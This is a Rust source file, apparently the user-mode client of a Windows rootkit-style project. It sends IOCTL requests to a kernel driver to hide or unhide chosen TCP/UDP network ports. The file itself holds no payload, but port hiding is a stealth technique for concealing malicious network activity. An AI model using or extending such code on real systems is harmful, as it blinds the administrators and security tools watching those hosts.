use std::{ffi::c_void, ptr::null_mut};
use log::{info, error, debug};
use windows_sys::Win32::{
    Foundation::{CloseHandle, GetLastError, HANDLE},
    System::IO::DeviceIoControl,
};

use common::structs::TargetPort;
use crate::utils::{
    open_driver,
    PortType, 
    Protocol
};

/// Provides operations for managing network ports through a driver interface.
pub struct Network(HANDLE);

impl Network {
    /// Creates a new `Port`.
    pub fn new() -> Self {
        let h_driver = open_driver().expect("Error");
        Self(h_driver)
    }

    /// Hides or unhides a specific network port.
    pub fn hide_unhide_port(
        self,
        ioctl_code: u32,
        protocol: Protocol,
        port_type: PortType,
        port_number: u16,
        enable: bool,
    ) {
        let mut port_info = TargetPort {
            protocol: protocol.to_shared(),
            port_type: port_type.to_shared(),
            port_number,
            enable,
        };

        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.0,
                ioctl_code,
                &mut port_info as *mut _ as *mut c_void,
                size_of::<TargetPort>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl failed with status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            info!("Port with number {} successfully {}hidden", port_number, if enable { "" } else { "un" });
        }
    }
}

impl Drop for Network {
    fn drop(&mut self) {
        debug!("Closing the driver handle");
        unsafe { CloseHandle(self.0) };
    }
}
